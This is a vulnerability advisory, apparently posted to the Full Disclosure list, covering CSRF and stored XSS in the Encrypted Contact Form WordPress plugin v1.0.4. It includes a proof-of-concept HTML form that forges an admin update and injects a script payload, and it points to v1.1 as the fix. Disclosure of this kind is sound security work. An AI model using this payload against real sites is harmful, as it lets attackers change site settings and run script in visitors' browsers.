Subject: [FD] CSRF & XSS vulnerabilities in Encrypted Contact Form Wordpress
	Plugin v1.0.4

# Title: Cross-site Request Forgery & Cross-site Scripting in Encrypted
Contact Form Wordpress Plugin v1.0.4
# Submitter: Nitin Venkatesh
# Product: Encrypted Contact Form Wordpress Plugin
# Product URL: https://wordpress.org/plugins/encrypted-contact-form/
# Vulnerability Type: Cross-site Request Forgery [CWE-352], Cross-site
scripting[CWE-79]
# Affected Versions: v1.0.4 and possibly below.
# Tested versions: v1.0.4
# Fixed Version: v1.1
# Link to code diff: https://plugins.trac.wordpress.org/changeset/1125443/
# Changelog: https://wordpress.org/plugins/encrypted-contact-form/changelog/
# CVE Status: None/Unassigned/Fresh

## Product Information:

Secure contact form for WordPress. Uses end-to-end encryption to send user
information. Not even your hosting provider can view the content.

Let users send you information in a secure way. Uses I.CX messaging service
to encrypt user content in their own web browsers before sending to you.
## Vulnerability Description:

The forms in the admin area of the plugin are vulnerable to CSRF, via which
the contact forms generated are susceptible to XSS via unsanitized POST
parameter.

For example, the admin function of updating an existing form can be done
via CSRF. Hence, by submitting a crafted HTML string in the parameters via
CSRF, a XSS attack gets launched which affects all the visitors of the
page(s) containing the contact form.
## Proof of Concept:

<form action="http://localhost/wp-admin/options-general.php?page=conformconf"
method="post">
<input type="hidden" name="name" value="required" />
<input type="hidden" name="email" value="optional" />
<input type="hidden" name="phone" value="off" />
<input type="hidden" name="message" value="required" />
<input type="hidden" name="display_name" value="Example" />
<input type="hidden" name="recipient_name" value="example" />
<input type="hidden" name="cfc_page_name" value="" />
<!-- Wordpress page-id value -->
<input type="hidden" name="existing_page" value="28" />
<input type="hidden" name="cfc_selection" value="upd" />
<input type="hidden" name="iframe_url"
value="&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert('XSS!');&lt;/script&gt;"
/>
<input type="submit" value="Update Page">
</form>

## Solution:

Upgrade to v1.1 of the plugin.
